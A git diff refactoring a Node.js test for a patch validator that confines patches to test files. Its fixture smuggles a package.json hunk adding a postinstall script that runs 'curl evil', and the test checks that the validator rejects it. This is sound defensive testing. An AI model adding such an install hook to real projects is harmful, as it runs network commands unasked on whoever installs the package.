@@ -1,11 +1,12 @@
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
-import { execFileSync, spawnSync } from 'node:child_process';
-import { mkdirSync, mkdtempSync, writeFileSync } from 'node:fs';
+import { execFileSync } from 'node:child_process';
+import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { checkContent, checkStructure } from './validate-patch.mjs';
 import { loadPolicy } from './policy.mjs';
+import { runScript } from './test-helpers.mjs';
 
 const policy = loadPolicy();
 const diff = (path, header = '') =>
@@ -40,28 +41,41 @@ test('rejects fewer tests and new focus or skip markers', () => {
   assert.equal(checkContent(before, before.replace("it('a'", "it.only('a'"), 'f').length, 1);
 });
 
-test('rejects patches that change non-test files through plain unified diff sections', () => {
-  const dir = mkdtempSync(join(tmpdir(), 'vp-'));
-  const git = (...a) => execFileSync('git', a, { cwd: dir, encoding: 'utf8' });
+// A throwaway repo with one test file and a package.json, the file an attacker would target.
+// Patches are written next to it, outside the checkout, so the checkout stays clean.
+function makeRepo(t) {
+  const dir = mkdtempSync(join(tmpdir(), 'validate-patch-'));
+  t.after(() => rmSync(dir, { recursive: true, force: true }));
+  const repo = join(dir, 'repo');
+  const git = (...args) => execFileSync('git', args, { cwd: repo, encoding: 'utf8' });
+  mkdirSync(join(repo, 'backend/tests'), { recursive: true });
   git('init', '-q');
-  mkdirSync(join(dir, 'backend/tests'), { recursive: true });
-  writeFileSync(join(dir, 'package.json'), '{}\n');
-  writeFileSync(join(dir, 'backend/tests/a.test.ts'), "it('a', () => {})\n");
+  writeFileSync(join(repo, 'package.json'), '{}\n');
+  writeFileSync(join(repo, 'backend/tests/a.test.ts'), "it('a', () => {})\n");
   git('add', '.');
   git('-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-qm', 'init');
-  const testHunk = "diff --git a/backend/tests/a.test.ts b/backend/tests/a.test.ts\n--- a/backend/tests/a.test.ts\n+++ b/backend/tests/a.test.ts\n@@ -1 +1,2 @@\n it('a', () => {})\n+it('b', () => {})\n";
-  const smuggled = "--- a/package.json\n+++ b/package.json\n@@ -1 +1 @@\n-{}\n+{\"scripts\":{\"postinstall\":\"curl evil\"}}\n";
-  const validate = (patch) => {
-    const file = join(dir, '..', `${Date.now()}.patch`);
+  return { dir, repo, git };
+}
+
+test('applied patches are judged by the files they change, not by their diff headers', (t) => {
+  const { dir, repo, git } = makeRepo(t);
+  const addTest = "diff --git a/backend/tests/a.test.ts b/backend/tests/a.test.ts\n--- a/backend/tests/a.test.ts\n+++ b/backend/tests/a.test.ts\n@@ -1 +1,2 @@\n it('a', () => {})\n+it('b', () => {})\n";
+  const smuggledInstallScript = "--- a/package.json\n+++ b/package.json\n@@ -1 +1 @@\n-{}\n+{\"scripts\":{\"postinstall\":\"curl evil\"}}\n";
+  const validate = (patch, name) => {
+    const file = join(dir, `${name}.patch`);
     writeFileSync(file, patch);
-    const r = spawnSync('node', [join(process.cwd(), '.github/scripts/validate-patch.mjs'), file, '--repo', dir], { encoding: 'utf8' });
+    const result = runScript('.github/scripts/validate-patch.mjs', [file, '--repo', repo]);
     git('checkout', '-q', '--', '.');
-    return r;
+    return result;
   };
-  assert.equal(validate(testHunk).status, 0);
-  for (const patch of [testHunk + smuggled, smuggled + testHunk]) {
-    const r = validate(patch);
-    assert.equal(r.status, 1);
-    assert.match(r.stderr, /package\.json: not a writable test path/);
+
+  assert.equal(validate(addTest, 'clean').status, 0);
+  for (const [name, patch] of [['after', addTest + smuggledInstallScript], ['before', smuggledInstallScript + addTest]]) {
+    const result = validate(patch, name);
+    assert.equal(result.status, 1, name);
+    assert.match(result.stderr, /package\.json: not a writable test path/);
   }
+  const stale = validate(addTest.replace(" it('a'", " it('z'"), 'stale');
+  assert.equal(stale.status, 1);
+  assert.match(stale.stderr, /does not apply/);
 });
